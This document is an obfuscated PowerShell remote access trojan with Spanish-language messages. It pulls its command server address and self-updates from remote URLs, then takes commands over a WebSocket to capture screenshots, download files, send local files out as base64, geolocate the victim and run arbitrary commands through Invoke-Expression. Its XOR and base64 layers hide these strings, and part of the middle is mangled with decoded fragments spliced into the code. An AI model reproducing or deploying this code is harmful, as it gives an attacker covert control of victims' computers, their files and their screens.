$CurrentScriptVersion = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MS4wLjE='))) 
$VersionCheckUrl = ([System.Text.Encoding]::UTF8.GetString([byte[]](0x68,0x74,0x74,0x70,0x73,0x3A,0x2F,0x2F,0x72,0x61,0x77,0x2E,0x67,0x69,0x74,0x68,0x75,0x62,0x75,0x73,0x65,0x72,0x63,0x6F,0x6E,0x74,0x65,0x6E,0x74,0x2E,0x63,0x6F,0x6D,0x2F,0x70,0x75,0x6C,0x67,0x61,0x78,0x2D,0x67,0x2F,0x72,0x61,0x74,0x2F,0x72,0x65,0x66,0x73,0x2F,0x68,0x65,0x61,0x64,0x73,0x2F,0x6D,0x61,0x69,0x6E,0x2F,0x76,0x65,0x72,0x73,0x69,0x6F,0x6E)))
$ScriptDownloadUrlTemplate = $($k9706=215;$b=[byte[]](0xbf,0xa3,0xa3,0xa7,0xa4,0xed,0xf8,0xf8,0xa5,0xb6,0xa0,0xf9,0xb0,0xbe,0xa3,0xbf,0xa2,0xb5,0xa2,0xa4,0xb2,0xa5,0xb4,0xb8,0xb9,0xa3,0xb2,0xb9,0xa3,0xf9,0xb4,0xb8,0xba,0xf8,0xa7,0xa2,0xbb,0xb0,0xb6,0xaf,0xfa,0xb0,0xf8,0xa5,0xb6,0xa3,0xf8,0xa5,0xb2,0xb1,0xa4,0xf8,0xbf,0xb2,0xb6,0xb3,0xa4,0xf8,0xba,0xb6,0xbe,0xb9,0xf8,0xb4,0xbb,0xbe,0xf9,0xa7,0xa4,0xe6);-join($b|%{[char]($_-bxor$k9706)})) 
$UriConfigUrl = $($k8375=192;$b=[byte[]](0xa8,0xb4,0xb4,0xb0,0xb3,0xfa,0xef,0xef,0xb2,0xa1,0xb7,0xee,0xa7,0xa9,0xb4,0xa8,0xb5,0xa2,0xb5,0xb3,0xa5,0xb2,0xa3,0xaf,0xae,0xb4,0xa5,0xae,0xb4,0xee,0xa3,0xaf,0xad,0xef,0xb0,0xb5,0xac,0xa7,0xa1,0xb8,0xed,0xa7,0xef,0xb2,0xa1,0xb4,0xef,0xb2,0xa5,0xa6,0xb3,0xef,0xa8,0xa5,0xa1,0xa4,0xb3,0xef,0xad,0xa1,0xa9,0xae,0xef,0xb5,0xb2,0xac);-join($b|%{[char]($_-bxor$k8375)}))
$connectionTimeoutSeconds = 300
$reconnectDelaySeconds = 1 
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms
$uri = $null
try {
    Write-Host ((-join([char]0x4F, [char]0x62, [char]0x74, [char]0x65, [char]0x6E, [char]0x69, [char]0x65, [char]0x6E, [char]0x64, [char]0x6F, [char]0x20, [char]0x57, [char]0x65, [char]0x62, [char]0x53, [char]0x6F, [char]0x63, [char]0x6B, [char]0x65, [char]0x74, [char]0x20, [char]0x55, [char]0x52, [char]0x49, [char]0x20, [char]0x64, [char]0x65, [char]0x73, [char]0x64, [char]0x65, [char]0x20)) + $UriConfigUrl + "$([char]0x2E)$([char]0x2E)$([char]0x2E)")
    $uri = Invoke-RestMethod -Uri $UriConfigUrl -UseBasicParsing -TimeoutSec 10
    $uri = $uri.Trim()
    if ([string]::IsNullOrWhiteSpace($uri)) {
        throw ([System.Text.Encoding]::UTF8.GetString([byte[]](0x4C,0x61,0x20,0x55,0x52,0x49,0x20,0x6F,0x62,0x74,0x65,0x6E,0x69,0x64,0x61,0x20,0x65,0x73,0x74,0xC3,0xA1,0x20,0x76,0x61,0x63,0xC3,0xAD,0x61,0x20,0x6F,0x20,0x65,0x73,0x20,0x6E,0x75,0x6C,0x61,0x2E)))
    }
    Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VVJJIGNhcmdhZGE6IA=='))) + $uri)
} catch {
    Write-Error (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Tm8gc2UgcHVkbyBvYnRlbmVyIGxhIFVSSSBkZWwgV2ViU29ja2V0LiBFcnJvcjog'))) + $($_.Exception.Message))
    Exit
}

(Get-Culture).Name | Out-Null
function Update-Script {
    param(
        [string]$currentVersion,
        [string]$versionUrl,
        [string]$downloadUrlTemplate
    )

    Write-Host ("$([char]0x56)$([char]0x65)$([char]0x72)$([char]0x69)$([char]0x66)$([char]0x69)$([char]0x63)$([char]0x61)$([char]0x6E)$([char]0x64)$([char]0x6F)$([char]0x20)$([char]0x61)$([char]0x63)$([char]0x74)$([char]0x75)$([char]0x61)$([char]0x6C)$([char]0x69)$([char]0x7A)$([char]0x61)$([char]0x63)$([char]0x69)$([char]0x6F)$([char]0x6E)$([char]0x65)$([char]0x73)$([char]0x20)$([char]0x65)$([char]0x6E)$([char]0x20)" + $versionUrl + (-join([char]0x2E, [char]0x2E, [char]0x2E)))
    $latestVersion = $null
    try {
        $latestVersion = Invoke-RestMethod -Uri $versionUrl -UseBasicParsing -TimeoutSec 10
        $latestVersion = $latestVersion.Trim()
        Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('w5psdGltYSB2ZXJzacOzbiBkaXNwb25pYmxlIHJlcG9ydGFkYTog'))) + $latestVersion)
    } catch {
        Write-Warning (([System.Text.Encoding]::UTF8.GetString([byte[]](0x4E,0x6F,0x20,0x73,0x65,0x20,0x70,0x75,0x64,0x6F,0x20,0x76,0x65,0x72,0x69,0x66,0x69,0x63,0x61,0x72,0x20,0x6C,0x61,0x20,0x76,0x65,0x72,0x73,0x69,0xC3,0xB3,0x6E,0x20,0x64,0x65,0x6C,0x20,0x73,0x63,0x72,0x69,0x70,0x74,0x2E,0x20,0x45,0x72,0x72,0x6F,0x72,0x3A,0x20))) + $($_.Exception.Message))
        return 
    }

    
    if ($latestVersion -ne $null -and [version]$latestVersion -gt [version]$currentVersion) {
        Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('wqFIYXkgdW5hIG51ZXZhIHZlcnNpw7NuIGRpc3BvbmlibGUgKA=='))) + $latestVersion + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KSEgRGVzY2FyZ2FuZG8uLi4='))))

        $downloadUrl = $downloadUrlTemplate -f $latestVersion 
        $scriptPath = $MyInvocation.MyCommand.Path 
        $tempScriptPath = ($scriptPath + "$([char]0x2E)$([char]0x74)$([char]0x6D)$([char]0x70)") 

        try {
            Write-Host (([System.Text.Encoding]::UTF8.GetString([byte[]](0x44,0x65,0x73,0x63,0x61,0x72,0x67,0x61,0x6E,0x64,0x6F,0x20,0x64,0x65,0x73,0x64,0x65,0x3A,0x20))) + $downloadUrl)

            Invoke-WebRequest -Uri $downloadUrl -OutFile $tempScriptPath -UseBasicParsing -TimeoutSec 120
            Write-Host $($k4947=218;$b=[byte[]](0x9e,0xbf,0xa9,0xb9,0xbb,0xa8,0xbd,0xbb,0xfa,0xb9,0xb5,0xb7,0xaa,0xb6,0xbf,0xae,0xbb,0xbe,0xbb,0xf4,0xfa,0x88,0xbf,0xbf,0xb7,0xaa,0xb6,0xbb,0xa0,0xbb,0xb4,0xbe,0xb5,0xfa,0xa9,0xb9,0xa8,0xb3,0xaa,0xae,0xfa,0xbb,0xb9,0xae,0xaf,0xbb,0xb6,0xf4,0xf4,0xf4);-join($b|%{[char]($_-bxor$k4947)}))

            Start-Sleep -Seconds 2

            if (Test-Path $scriptPath) {
                Remove-Item $scriptPath -Force
            }

            Rename-Item $tempScriptPath -NewName $scriptPath -Force

            Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2NyaXB0IGFjdHVhbGl6YWRvIGEgbGEgdmVyc2nDs24g'))) + $latestVersion + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LiBSZWluaWNpYW5kby4uLg=='))))
            
            Start-Process powershell.exe $($k2438='MM7_E';$b=[byte[]](0x60,0x03,0x58,0x0F,0x37,0x22,0x2B,0x5E,0x33,0x20,0x6D,0x60,0x72,0x27,0x20,0x2E,0x38,0x43,0x36,0x2A,0x23,0x1D,0x58,0x33,0x2C,0x2E,0x34,0x17,0x1D,0x3C,0x3D,0x2C,0x44,0x2C,0x65,0x60,0x0B,0x5E,0x33,0x20,0x6D,0x2D);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2438);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))$scriptPath`"([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('DQogICAgICAgICAgICANCiAgICAgICAgICAgICMgQ2VycmFyIGVsIHByb2Nlc28gYWN0dWFsIHVuYSB2ZXogcXVlIGxhIG51ZXZhIGluc3RhbmNpYSBzZSBoYSBpbmljaWFkbw0KICAgICAgICAgICAgRXhpdA0KDQogICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgV3JpdGUtRXJyb3Ig')))Error durante la actualización del script. $($_.Exception.Message)("$([char]0x0D)$([char]0x0A)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x23)$([char]0x20)$([char]0x4C)$([char]0x69)$([char]0x6D)$([char]0x70)$([char]0x69)$([char]0x61)$([char]0x72)$([char]0x20)$([char]0x65)$([char]0x6C)$([char]0x20)$([char]0x61)$([char]0x72)$([char]0x63)$([char]0x68)$([char]0x69)$([char]0x76)$([char]0x6F)$([char]0x20)$([char]0x74)$([char]0x65)$([char]0x6D)$([char]0x70)$([char]0x6F)$([char]0x72)$([char]0x61)$([char]0x6C)$([char]0x20)$([char]0x73)$([char]0x69)$([char]0x20)$([char]0x6F)$([char]0x63)$([char]0x75)$([char]0x72)$([char]0x72)$([char]0x69)$([char]0xF3)$([char]0x20)$([char]0x75)$([char]0x6E)$([char]0x20)$([char]0x65)$([char]0x72)$([char]0x72)$([char]0x6F)$([char]0x72)$([char]0x0D)$([char]0x0A)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x69)$([char]0x66)$([char]0x20)$([char]0x28)$([char]0x54)$([char]0x65)$([char]0x73)$([char]0x74)$([char]0x2D)$([char]0x50)$([char]0x61)$([char]0x74)$([char]0x68)$([char]0x20)" + $tempScriptPath + (-join([char]0x29, [char]0x20, [char]0x7B, [char]0x0D, [char]0x0A, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x52, [char]0x65, [char]0x6D, [char]0x6F, [char]0x76, [char]0x65, [char]0x2D, [char]0x49, [char]0x74, [char]0x65, [char]0x6D, [char]0x20)) + $tempScriptPath + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x20,0x2D,0x46,0x6F,0x72,0x63,0x65,0x0D,0x0A,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x7D,0x0D,0x0A,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x7D,0x0D,0x0A,0x20,0x20,0x20,0x20,0x7D,0x20,0x65,0x6C,0x73,0x65,0x20,0x7B,0x0D,0x0A,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x57,0x72,0x69,0x74,0x65,0x2D,0x48,0x6F,0x73,0x74,0x20))))El script está actualizado (Versión $currentVersion).($($k7187=75;$b=[byte[]](0x46,0x41,0x6b,0x6b,0x6b,0x6b,0x36,0x46,0x41,0x36,0x46,0x41,0x46,0x41);-join($b|%{[char]($_-bxor$k7187)})) + $PSVersionTable + $($k4653=116;$b=[byte[]](0x5a,0x24,0x27,0x22,0x11,0x06,0x07,0x1d,0x1b,0x1a,0x5a,0x20,0x1b,0x27,0x00,0x06,0x1d,0x1a,0x13,0x5c,0x5d,0x54,0x08,0x54,0x3b,0x01,0x00,0x59,0x3a,0x01,0x18,0x18,0x79,0x7e,0x57,0x54,0x37,0x1b,0x1a,0x1a,0x11,0x17,0x00,0x54,0x23,0x11,0x16,0x27,0x1b,0x17,0x1f,0x11,0x00,0x79,0x7e);-join($b|%{[char]($_-bxor$k4653)})) + $ws + $($k9933=134;$b=[byte[]](0xa6,0xbb,0xa6,0xc8,0xe3,0xf1,0xab,0xc9,0xe4,0xec,0xe3,0xe5,0xf2,0xa6,0xd5,0xff,0xf5,0xf2,0xe3,0xeb,0xa8,0xc8,0xe3,0xf2,0xa8,0xd1,0xe3,0xe4,0xd5,0xe9,0xe5,0xed,0xe3,0xf2,0xf5,0xa8,0xc5,0xea,0xef,0xe3,0xe8,0xf2,0xd1,0xe3,0xe4,0xd5,0xe9,0xe5,0xed,0xe3,0xf2,0x8b,0x8c);-join($b|%{[char]($_-bxor$k9933)})) + $ws + $($k8904='MrU#7MB?ngz)@';$b=[byte[]](0x63,0x31,0x3A,0x4D,0x59,0x28,0x21,0x4B,0x2F,0x14,0x03,0x47,0x23,0x65);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8904);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + $uri + $($k6316='SBg10K-0tqgd2h';$b=[byte[]](0x7F,0x62,0x3C,0x62,0x49,0x38,0x59,0x55,0x19,0x5F,0x33,0x0C,0x40,0x0D,0x32,0x26,0x0E,0x5F,0x57,0x65,0x6E,0x51,0x1A,0x12,0x02,0x08,0x5E,0x09,0x27,0x2B,0x08,0x5F,0x64,0x24,0x46,0x55,0x1A,0x2C,0x5D,0x5E,0x7C,0x07,0x3D,0x27,0x4E,0x1F,0x67,0x2A,0x44,0x44,0x5C,0x58,0x6A,0x6E,0x3F,0x62,0x70,0x62,0x34,0x48,0x43,0x3F,0x48,0x5D,0x54,0x15,0x06,0x10,0x53,0x65,0x59);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6316);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + $user + $($k5556='@Cw$SJ';$b=[byte[]](0x60,0x7E,0x57);$kb=[System.Text.Encoding]::UTF8.GetBytes($k5556);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + $env + $($k6514=234;$b=[byte[]](0xd0,0xbf,0xb9,0xaf,0xb8,0xa4,0xab,0xa7,0xaf,0xe7,0xe0);-join($b|%{[char]($_-bxor$k6514)})) + $ip + $($k5409='*cbH@+EiG5Wz';$b=[byte[]](0x0A,0x5E,0x42,0x60,0x07,0x4E,0x31,0x44,0x09,0x50,0x23,0x33,0x7A,0x22,0x06,0x2C,0x32,0x4E,0x36,0x1A,0x67,0x18,0x16,0x1E,0x4E,0x11,0x07,0x3B,0x33,0x6D,0x24,0x04,0x2E,0x59,0x2E,0x5A,0x63,0x33,0x14,0x7C,0x60,0x57,0x65,0x3E,0x2F,0x50,0x25,0x1F,0x07,0x2C,0x00,0x22,0x25,0x48,0x31,0x49,0x3C,0x15);$kb=[System.Text.Encoding]::UTF8.GetBytes($k5409);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + $_ + $($k3293=',:<j>2JH3';$b=[byte[]](0x02,0x73,0x6C,0x2B,0x5A,0x56,0x38,0x2D,0x40,0x5F,0x1A,0x11,0x04,0x51,0x46,0x26,0x21,0x58,0x49,0x1A);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3293);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))169.254*($($k2837=225;$b=[byte[]](0xc1,0x9c,0xc1,0x9d,0xc1,0xb2,0x84,0x8d,0x84,0x82,0x95,0xcc,0xae,0x83,0x8b,0x84,0x82,0x95,0xc1,0xcc,0xa7,0x88,0x93,0x92,0x95,0xc1,0xd0,0xc1,0xcc,0xa4,0x99,0x91,0x80,0x8f,0x85,0xb1,0x93,0x8e,0x91,0x84,0x93,0x95,0x98,0xc1,0xa8,0xb1,0xa0,0x85,0x85,0x93,0x84,0x92,0x92,0xc8,0xec,0xeb,0xec,0xeb,0xc2,0xc1,0xa7,0x94,0x8f,0x82,0x95,0x88,0x8e,0x8f,0xc1,0x95,0x8e,0xc1,0x92,0x84,0x8f,0x85,0xc1,0x95,0x84,0x99,0x95,0xc1,0x95,0x8e,0xc1,0x95,0x89,0x84,0xc1,0x92,0x84,0x93,0x97,0x84,0x93,0xec,0xeb,0x87,0x94,0x8f,0x82,0x95,0x88,0x8e,0x8f,0xc1,0xb2,0x84,0x8f,0x85,0xcc,0xa3,0x80,0x82,0x8a,0xc9);-join($b|%{[char]($_-bxor$k2837)})) + $text + $($k4797=18;$b=[byte[]](0x3b,0x32,0x69,0x1f,0x18,0x32,0x32,0x32,0x32);-join($b|%{[char]($_-bxor$k4797)})) + $bytes + $($k9849=230;$b=[byte[]](0xc6,0xdb,0xc6,0xbd,0xb2,0x83,0x9e,0x92,0xc8,0xa3,0x88,0x85,0x89,0x82,0x8f,0x88,0x81,0xbb,0xdc,0xdc,0xb3,0xb2,0xa0,0xde,0xc8,0xa1,0x83,0x92,0xa4,0x9f,0x92,0x83,0x95,0xce);-join($b|%{[char]($_-bxor$k9849)})) + $text + $($k7342='{L=0>lzMk_D,';$b=[byte[]](0x52,0x41,0x37,0x10,0x1E,0x4C,0x5A);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7342);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + $ws + $($k7406=114;$b=[byte[]](0x5c,0x21,0x17,0x1c,0x16,0x33,0x01,0x0b,0x1c,0x11,0x5a,0x7f,0x78,0x52,0x52,0x52,0x52,0x52,0x52,0x52,0x52,0x29,0x21,0x0b,0x01,0x06,0x17,0x1f,0x5c,0x33,0x00,0x00,0x13,0x0b,0x21,0x17,0x15,0x1f,0x17,0x1c,0x06,0x29,0x10,0x0b,0x06,0x17,0x2f,0x2f,0x48,0x48,0x1c,0x17,0x05,0x5a);-join($b|%{[char]($_-bxor$k7406)})) + $bytes + $($k3787=153;$b=[byte[]](0xb0,0xb5,0x94,0x93,0xb9,0xb9,0xb9,0xb9,0xb9,0xb9,0xb9,0xb9,0xc2,0xca,0xe0,0xea,0xed,0xfc,0xf4,0xb7,0xd7,0xfc,0xed,0xb7,0xce,0xfc,0xfb,0xca,0xf6,0xfa,0xf2,0xfc,0xed,0xea,0xb7,0xce,0xfc,0xfb,0xca,0xf6,0xfa,0xf2,0xfc,0xed,0xd4,0xfc,0xea,0xea,0xf8,0xfe,0xfc,0xcd,0xe0,0xe9,0xfc,0xc4,0xa3,0xa3,0xcd,0xfc,0xe1,0xed,0xb5,0x94,0x93,0xb9,0xb9,0xb9,0xb9,0xb9,0xb9,0xb9,0xb9);-join($b|%{[char]($_-bxor$k3787)})) + $true + $($k4014=76;$b=[byte[]](0x60,0x41,0x46,0x6c,0x6c,0x6c,0x6c,0x6c,0x6c,0x6c,0x6c,0x17,0x1f,0x35,0x3f,0x38,0x29,0x21,0x62,0x18,0x24,0x3e,0x29,0x2d,0x28,0x25,0x22,0x2b,0x62,0x0f,0x2d,0x22,0x2f,0x29,0x20,0x20,0x2d,0x38,0x25,0x23,0x22,0x18,0x23,0x27,0x29,0x22,0x11,0x76,0x76,0x02,0x23,0x22,0x29,0x41,0x46,0x6c,0x6c,0x6c,0x6c,0x65,0x62,0x1b,0x2d,0x25,0x38,0x64,0x65,0x41,0x46,0x31,0x41,0x46,0x41,0x46);-join($b|%{[char]($_-bxor$k4014)})) + $p95Gg + $($k6553=227;$b=[byte[]](0xc3,0xde,0xc3,0xc4,0x9b,0x80,0x99,0xd1,0x8f,0xc4,0xc3,0xc9,0xc3,0xd6,0xd8,0xc3);-join($b|%{[char]($_-bxor$k6553)})) + $p95Gg + $($k6973=195;$b=[byte[]](0xed,0x91,0xa6,0xb3,0xaf,0xa2,0xa0,0xa6,0xeb,0xe4,0xa5,0xe4,0xef,0xe3,0xe4,0xb7,0xe4,0xea,0xe3,0xbf,0xe3,0x8c,0xb6,0xb7,0xee,0x8d,0xb6,0xaf,0xaf,0xf8,0xe3,0x91,0xa6,0xae,0xac,0xb5,0xa6,0xee,0x95,0xa2,0xb1,0xaa,0xa2,0xa1,0xaf,0xa6,0xe3,0xb3,0xfa,0xf6,0x84,0xa4,0xe3,0xee,0x86,0xb1,0xb1,0xac,0xb1,0x82,0xa0,0xb7,0xaa,0xac,0xad,0xe3,0x90,0xaa,0xaf,0xa6,0xad,0xb7,0xaf,0xba,0x80,0xac,0xad,0xb7,0xaa,0xad,0xb6,0xa6,0xce,0xc9,0xe0,0xe3,0x80,0xac,0xad,0xad,0xa6,0xa0,0xb7,0xaa,0xac,0xad,0xe3,0xad,0xac,0xb7,0xaa,0xa0,0xa6,0xce,0xc9,0x90,0xa6,0xad,0xa7,0xee,0x81,0xa2,0xa0,0xa8,0xe3);-join($b|%{[char]($_-bxor$k6973)})))$user $ip se ha conectado"

$buffer = New-Object byte[] 16384

while ($true) {

    $result = $ws.ReceiveAsync($buffer, [System.Threading.CancellationToken]::None).Result
    if ($result.Count -le 0) { continue }

    $msg = [Text.Encoding]::UTF8.GetString($buffer, 0, $result.Count).Trim()
    if ([string]::IsNullOrWhiteSpace($msg)) { continue }

    
    if ($msg -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('L2hlbHA=')))) {
        Send-Back "$([char]0x43)$([char]0x6F)$([char]0x6D)$([char]0x61)$([char]0x6E)$([char]0x64)$([char]0x6F)$([char]0x73)$([char]0x20)$([char]0x64)$([char]0x69)$([char]0x73)$([char]0x70)$([char]0x6F)$([char]0x6E)$([char]0x69)$([char]0x62)$([char]0x6C)$([char]0x65)$([char]0x73)$([char]0x3A)$([char]0x60)$([char]0x6E)$([char]0x2F)$([char]0x68)$([char]0x65)$([char]0x6C)$([char]0x70)$([char]0x60)$([char]0x6E)$([char]0x26)$([char]0x73)$([char]0x73)$([char]0x68)$([char]0x6F)$([char]0x74)$([char]0x60)$([char]0x6E)$([char]0x26)$([char]0x64)$([char]0x77)$([char]0x20)$([char]0x3C)$([char]0x75)$([char]0x72)$([char]0x6C)$([char]0x3E)$([char]0x60)$([char]0x6E)$([char]0x26)$([char]0x67)$([char]0x65)$([char]0x74)$([char]0x20)$([char]0x3C)$([char]0x72)$([char]0x75)$([char]0x74)$([char]0x61)$([char]0x3E)$([char]0x60)$([char]0x6E)$([char]0x26)$([char]0x6C)$([char]0x6F)$([char]0x63)$([char]0x61)$([char]0x74)$([char]0x69)$([char]0x6F)$([char]0x6E)$([char]0x60)$([char]0x6E)$([char]0x21)$([char]0x3C)$([char]0x63)$([char]0x6F)$([char]0x6D)$([char]0x61)$([char]0x6E)$([char]0x64)$([char]0x6F)$([char]0x3E)"
        continue
    }

    if ($msg -eq "$([char]0x26)$([char]0x73)$([char]0x73)$([char]0x68)$([char]0x6F)$([char]0x74)") {
        try {
            $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
            $gfx = [System.Drawing.Graphics]::FromImage($bmp)
            $gfx.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

            $path = ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlVTRVJQUk9GSUxFXERlc2t0b3BcY2FwdHVyYV8='))) + $(Get-Date -Format 'yyyyMMdd_HHmmss') + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LnBuZw=='))))
            $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)

            $gfx.Dispose()
            $bmp.Dispose()

            Send-Back (([System.Text.Encoding]::UTF8.GetString([byte[]](0x43,0x61,0x70,0x74,0x75,0x72,0x61,0x20,0x67,0x75,0x61,0x72,0x64,0x61,0x64,0x61,0x20,0x65,0x6E,0x3A,0x20))) + $path)
        } catch {
            Send-Back $($k6201=195;$b=[byte[]](0x86,0xb1,0xb1,0xac,0xb1,0xe3,0xa2,0xaf,0xe3,0xa0,0xa2,0xb3,0xb7,0xb6,0xb1,0xa2,0xb1,0xe3,0xb3,0xa2,0xad,0xb7,0xa2,0xaf,0xaf,0xa2);-join($b|%{[char]($_-bxor$k6201)}))
        }
        continue
    }

    if ($msg.StartsWith(([System.Text.Encoding]::UTF8.GetString([byte[]](0x26,0x64,0x77,0x20))))) {
        try {
            $url = $msg.Substring(4).Trim()
            $file = Split-Path $url -Leaf
            $dest = ($env + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x3A,0x55,0x53,0x45,0x52,0x50,0x52,0x4F,0x46,0x49,0x4C,0x45,0x5C,0x44,0x6F,0x77,0x6E,0x6C,0x6F,0x61,0x64,0x73,0x5C))) + $file)
            Invoke-WebRequest $url -OutFile $dest -UseBasicParsing
            Send-Back (([System.Text.Encoding]::UTF8.GetString([byte[]](0x44,0x65,0x73,0x63,0x61,0x72,0x67,0x61,0x20,0x63,0x6F,0x6D,0x70,0x6C,0x65,0x74,0x61,0x64,0x61,0x3A,0x20))) + $dest)
        } catch {
            Send-Back ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RXJyb3IgZW4gZGVzY2FyZ2E=')))
        }
        continue
    }

    if ($msg.StartsWith("$([char]0x26)$([char]0x67)$([char]0x65)$([char]0x74)$([char]0x20)")) {
        $path = $msg.Substring(5).Trim()
        if (-not (Test-Path $path)) {
            Send-Back (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QXJjaGl2byBubyBleGlzdGU6IA=='))) + $path)
            continue
        }

        try {
            $bytes = [System.IO.File]::ReadAllBytes($path)
            $b64 = [Convert]::ToBase64String($bytes)
            $payload = $($k8811='@%n-a[O';$b=[byte[]](0x06,0x6C,0x22,0x68,0x5B);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8811);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + (Split-Path $path -Leaf) + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x3A))) + $b64
            Send-Back $payload
        } catch {
            Send-Back "$([char]0x45)$([char]0x72)$([char]0x72)$([char]0x6F)$([char]0x72)$([char]0x20)$([char]0x65)$([char]0x6E)$([char]0x76)$([char]0x69)$([char]0x61)$([char]0x6E)$([char]0x64)$([char]0x6F)$([char]0x20)$([char]0x61)$([char]0x72)$([char]0x63)$([char]0x68)$([char]0x69)$([char]0x76)$([char]0x6F)"
        }
        continue
    }

    if ($msg -eq $($k4152=242;$b=[byte[]](0xd4,0x9e,0x9d,0x91,0x93,0x86,0x9b,0x9d,0x9c);-join($b|%{[char]($_-bxor$k4152)}))) {
        try {
            $location = Invoke-RestMethod -Uri (-join([char]0x68, [char]0x74, [char]0x74, [char]0x70, [char]0x3A, [char]0x2F, [char]0x2F, [char]0x69, [char]0x70, [char]0x69, [char]0x6E, [char]0x66, [char]0x6F, [char]0x2E, [char]0x69, [char]0x6F, [char]0x2F, [char]0x6A, [char]0x73, [char]0x6F, [char]0x6E))
            $city = $location.city
            $region = $location.region
            $country = $location.country
            $loc = ($city + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LCA='))) + $region + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LCA='))) + $country)
            Send-Back ($($k6497=41;$b=[byte[]](0x7c,0x4b,0x40,0x4a,0x48,0x4a,0x40,0xea,0x9a,0x47,0x09,0x4c,0x51,0x48,0x4a,0x5d,0x48,0x13,0x09);-join($b|%{[char]($_-bxor$k6497)})) + $loc)
        } catch {
            Send-Back $($k9370=52;$b=[byte[]](0x71,0x46,0x46,0x5b,0x46,0x14,0x5b,0x56,0x40,0x51,0x5a,0x5d,0x51,0x5a,0x50,0x5b,0x14,0x41,0x56,0x5d,0x57,0x55,0x57,0x5d,0xf7,0x87,0x5a);-join($b|%{[char]($_-bxor$k9370)}))
        }
        continue
    }

    if ($msg.StartsWith($($k6051='nQhw[A<{i?';$b=[byte[]](0x4F);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6051);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))) {
        $command = $msg.Substring(1)
        try {
            $output = Invoke-Expression $command 2>&1 | Out-String
            if ([string]::IsNullOrWhiteSpace($output)) {
                $output = "$([char]0x5B)$([char]0x73)$([char]0x69)$([char]0x6E)$([char]0x20)$([char]0x73)$([char]0x61)$([char]0x6C)$([char]0x69)$([char]0x64)$([char]0x61)$([char]0x5D)"
            }
            Send-Back $output
        } catch {
            Send-Back ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('W2NvbWFuZG8gaW52w6FsaWRvIG8gZXJyb3IgZWplY3V0YW5kbyBjb21hbmRvXQ==')))
        }
    }
}
